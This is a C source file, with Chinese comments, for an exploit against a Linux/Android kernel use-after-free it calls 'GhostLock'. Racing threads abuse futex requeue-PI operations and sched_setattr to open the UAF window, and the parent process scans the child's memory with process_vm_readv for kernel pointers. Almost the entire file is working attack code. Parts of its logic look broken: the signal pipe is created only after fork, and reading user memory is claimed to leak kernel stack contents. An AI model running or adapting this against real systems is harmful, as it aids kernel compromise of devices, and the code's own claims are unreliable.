/*
 * leak_minimal.c — 最小 GhostLock UAF 触发 + process_vm_readv 泄露
 * 不依赖 PR_SET_MM_MAP, 不依赖 pselect, 不依赖 inet6_protos
 * 只做一件事: 触发 UAF, 然后在子进程死掉之前扫它的地址空间找内核指针
 *
 * 编译: aarch64-linux-gnu-gcc -static -pthread -O0 -g -o leak_minimal leak_minimal.c
 * 或者用 NDK clang: aarch64-linux-android35-clang -static -pthread -O0 -o leak_minimal leak_minimal.c
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ---- 系统调用封装 ---- */
static long futex(uint32_t *uaddr, int op, uint32_t val,
                  const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static int futex_pi_lock(uint32_t *uaddr) {
    return (int)futex(uaddr, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
}

static int futex_wait_requeue_pi(uint32_t *uaddr, const struct timespec *ts,
                                  uint32_t *uaddr2) {
    return (int)futex(uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts, uaddr2, 0);
}

static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t val,
                                 uint32_t *uaddr2) {
    return (int)futex(uaddr, FUTEX_CMP_REQUEUE_PI, 1, (void *)(uintptr_t)val,
                       uaddr2, 0);
}

static void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

/* ---- 共享 futex 变量 ---- */
static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static volatile int waiter_ready;
static volatile int waiter_waiting;
static volatile int owner_started;
static volatile int deadlock_seen;
static volatile int consume_go;
static volatile int consume_seen;

static volatile pid_t waiter_tid;
static int signal_pipe[2];

/* ---- 日志宏 ---- */
#define LOG(fmt, ...) do { \
    struct timespec _ts; \
    clock_gettime(CLOCK_REALTIME, &_ts); \
    fprintf(stderr, "[%02ld.%03ld] " fmt, \
            _ts.tv_sec % 100, _ts.tv_nsec / 1000000, ##__VA_ARGS__); \
    fflush(stderr); \
} while(0)

/* ============================================================
 * 子进程: 三线程 GhostLock UAF 触发
 * ============================================================ */

static void *waiter_thread_fn(void *arg) {
    (void)arg;
    waiter_tid = syscall(SYS_gettid);

    LOG("waiter: tid=%d, locking pi_chain...\n", waiter_tid);
    futex_pi_lock(&f_pi_chain);
    LOG("waiter: pi_chain locked, waiting for owner...\n");

    waiter_ready = 1;
    while (!owner_started) { asm volatile("yield"); }

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 30;  /* 30 秒超时 */

    LOG("waiter: calling FUTEX_WAIT_REQUEUE_PI on f_wait -> f_pi_target\n");
    waiter_waiting = 1;

    int ret = futex_wait_requeue_pi(&f_wait, &ts, &f_pi_target);
    LOG("waiter: WAIT_REQUEUE_PI returned ret=%d errno=%d (UAF window OPEN)\n",
        ret, errno);

    /* === UAF 窗口在这里 ===
     * 内核 remove_waiter() 已经把 waiter 从 pi 树上移除,
     * 但栈还没被回收。此时本线程的内核栈上有残留的 rt_mutex_waiter 结构体。
     * 父进程应该在这个时间窗口内用 process_vm_readv 扫栈。
     */

    /* 等 deadlock_seen 信号, 然后通知消费者来消耗 */
    while (!deadlock_seen) { asm volatile("yield"); }

    consume_go = 1;
    LOG("waiter: consume_go=1, waiting for consumer to finish...\n");

    /* 等消费者用 sched_setattr 调度我们 (精确计时攻击的一部分) */
    while (!consume_seen) { asm volatile("yield"); }

    LOG("waiter: consumer finished, writing done signal\n");
    /* 通知父进程: UAF 窗口结束 */
    char done = 'x';
    write(signal_pipe[1], &done, 1);

    /* 保持存活, 让父进程有时机 process_vm_readv */
    sleep(60);
    return NULL;
}

static void *owner_thread_fn(void *arg) {
    (void)arg;
    LOG("owner: locking pi_target...\n");
    futex_pi_lock(&f_pi_target);
    LOG("owner: pi_target locked, waiting for waiter_ready...\n");

    while (!waiter_ready) { asm volatile("yield"); }
    owner_started = 1;

    LOG("owner: locking pi_chain (will deadlock)...\n");
    futex_pi_lock(&f_pi_chain);
    LOG("owner: pi_chain acquired (deadlock resolved)\n");

    for (;;) sleep(1);
    return NULL;
}

static void *consumer_thread_fn(void *arg) {
    (void)arg;
    pin_to_cpu(1);

    while (!consume_go) { asm volatile("yield"); }

    LOG("consumer: consume_go seen, calling sched_setattr on tid=%d...\n",
        waiter_tid);

    /* 反复调用 sched_setattr 来迫使内核调度器触碰 waiter 的栈 */
    for (int i = 0; i < 20; i++) {
        syscall(SYS_sched_setattr, waiter_tid,
                &(struct { uint32_t size; uint32_t policy;
                           uint64_t flags; int32_t nice;
                           uint32_t priority; uint64_t runtime;
                           uint64_t deadline; uint64_t period;
                           uint32_t util_min; uint32_t util_max; }) {
                    .size = 56, .policy = 3, .nice = 19 },
                0);
    }
    consume_seen = 1;
    LOG("consumer: done\n");
    return NULL;
}

static int child_do_uaf(void) {
    signal_pipe[0] = signal_pipe[1] = -1;
    pipe(signal_pipe);

    LOG("child: starting UAF trigger (pid=%d)\n", getpid());

    /* 顺序很重要: owner 先锁 pi_target, waiter 锁 pi_chain,
     * 然后 waiter wait_requeue_pi, owner 再锁 pi_chain → 死锁 */
    pthread_t owner_th, waiter_th, consumer_th;

    pthread_create(&waiter_th, NULL, waiter_thread_fn, NULL);
    usleep(5000);

    pthread_create(&owner_th, NULL, owner_thread_fn, NULL);
    pthread_create(&consumer_th, NULL, consumer_thread_fn, NULL);

    /* 等 waiter 进入 WAIT_REQUEUE_PI */
    while (!waiter_waiting || !owner_started) {
        usleep(1000);
    }
    usleep(100000);  /* 给 100ms 让一切稳定 */

    /* 触发 deadlock: FUTEX_CMP_REQUEUE_PI */
    LOG("child: triggering FUTEX_CMP_REQUEUE_PI → deadlock\n");
    int ret = futex_cmp_requeue_pi(&f_wait, 1, &f_pi_target);
    LOG("child: CMP_REQUEUE_PI returned ret=%d errno=%d\n", ret, errno);

    deadlock_seen = 1;

    /* 等子线程发 done 信号 */
    char c;
    read(signal_pipe[0], &c, 1);
    LOG("child: got done signal from waiter\n");

    /* 此时 waiter 线程在 sleep(60) 里, 但它的内核栈已经被回收
     * 父进程应该在这个时候 process_vm_readv */

    pause();
    return 0;
}

/* ============================================================
 * 父进程: process_vm_readv 扫栈泄露
 * ============================================================ */

static int leak_scan(pid_t child_pid) {
    struct iovec local_iov[1];
    struct iovec remote_iov[1];
    unsigned char buf[4096];
    uint64_t found[128];
    int nfound = 0;

    local_iov[0].iov_base = buf;
    remote_iov[0].iov_base = NULL;  /* 从地址 0 开始扫 */

    /* 扫子进程地址空间, 从 0 到 0x7fffffffffff (用户空间上限) */
    uintptr_t start = 0x1000;  /* 跳过 NULL 页 */
    uintptr_t end   = 0x7f0000000000ULL;

    LOG("parent: process_vm_readv scanning pid=%d [0x%lx - 0x%lx]\n",
        child_pid, start, end);

    for (uintptr_t addr = start; addr < end; addr += sizeof(buf)) {
        local_iov[0].iov_len = sizeof(buf);
        remote_iov[0].iov_base = (void *)addr;
        remote_iov[0].iov_len = sizeof(buf);

        ssize_t n = syscall(270, child_pid, local_iov, 1, remote_iov, 1, 0);
        /* syscall 270 = process_vm_readv */

        if (n <= 0) continue;

        /* 扫描每个 8 字节对齐位置, 找 0xffff 开头 (内核地址) */
        for (size_t off = 0; off + 8 <= (size_t)n; off += 8) {
            uint64_t val;
            memcpy(&val, buf + off, 8);

            if ((val >> 48) == 0xffff && val != 0xffffffffffffffffULL) {
                if (nfound < 128) {
                    found[nfound++] = val;
                }
            }
        }

        if (nfound > 0) break;  /* 找到就停 */
    }

    LOG("parent: found %d kernel pointers\n", nfound);
    for (int i = 0; i < nfound; i++) {
        LOG("  [%d] 0x%016lx\n", i, found[i]);
    }

    return nfound > 0 ? 0 : -1;
}

/* ============================================================
 * 主函数
 * ============================================================ */
int main(void) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    pin_to_cpu(0);
    LOG("=== leak_minimal: GhostLock UAF + process_vm_readv ===\n");

    pid_t child = fork();
    if (child == 0) {
        /* 子进程: 触发 UAF */
        pin_to_cpu(0);
        close(signal_pipe[0]);
        child_do_uaf();
        _exit(0);
    }

    /* 父进程: 等 UAF 窗口, 然后扫栈 */
    LOG("parent: child pid=%d, waiting for UAF window...\n", child);
    close(signal_pipe[1]);

    /* 等子进程的 done 信号 (waiter 线程进入 sleep 后) */
    char c;
    if (read(signal_pipe[0], &c, 1) <= 0) {
        LOG("parent: no signal from child, may have crashed\n");
    }

    /* 此时 UAF 窗口已过, 但内核栈可能还有残留 */
    LOG("parent: UAF window signaled, scanning child memory...\n");
    int result = leak_scan(child);

    if (result < 0) {
        LOG("parent: no kernel pointers found\n");
    } else {
        LOG("parent: SUCCESS — kernel pointers leaked\n");
    }

    close(signal_pipe[0]);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    return result;
}
